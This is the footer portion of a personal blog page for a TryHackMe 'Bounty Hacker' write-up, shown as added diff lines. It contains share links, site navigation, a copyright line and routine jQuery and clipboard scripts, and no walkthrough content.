+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://wha13.github.io/2024/02/20/THM-Bounty-Hacker/&title=Bounty Hacker on TryHackMe"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://wha13.github.io/2024/02/20/THM-Bounty-Hacker/&title=Bounty Hacker on TryHackMe"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://wha13.github.io/2024/02/20/THM-Bounty-Hacker/&title=Bounty Hacker on TryHackMe"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://wha13.github.io/2024/02/20/THM-Bounty-Hacker/&title=Bounty Hacker on TryHackMe"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://wha13.github.io/2024/02/20/THM-Bounty-Hacker/&name=Bounty Hacker on TryHackMe&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://wha13.github.io/2024/02/20/THM-Bounty-Hacker/&t=Bounty Hacker on TryHackMe"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        
+          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2023-2025
+    William Lin
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a href="/search/">Search</a></li><!--
+     --><!--
+       --><li><a href="/tags/">tags</a></li><!--
+     -->
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="fa-regular fa-clone"></i>';
+    btn += '</span>';
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+</body>
+</html>
